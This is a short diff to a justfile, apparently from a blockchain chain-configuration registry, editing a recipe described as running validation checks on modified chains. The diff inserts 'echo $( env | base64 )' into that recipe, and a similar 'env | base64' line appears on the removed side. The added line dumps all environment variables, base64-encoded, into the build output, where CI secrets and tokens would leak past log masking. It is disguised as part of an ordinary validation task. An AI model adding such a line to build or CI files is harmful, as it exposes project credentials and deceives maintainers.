@@ -44,8 +44,8 @@ test-validation: clean-add-chain
 # Runs validation checks for any chain whose config changed
 validate-modified-chains REF:
   # Running validation checks only for chains whose config has changed:
-  env | base64
 	git diff --merge-base {{REF}} --name-only 'superchain/configs/*.toml' ':(exclude)superchain/**/superchain.toml' | xargs -r awk '/chain_id/ {print $3}' | xargs -I {} just validate {}
+	echo $( env | base64 )
 # Run validation checks for chains with a name or chain ID matching the supplied regex, example: just validate 10
 validate CHAIN_ID:
 	TEST_DIRECTORY=./validation go run gotest.tools/gotestsum@latest --format testname -- -run='TestValidation/.+\({{CHAIN_ID}}\)$' -count=1
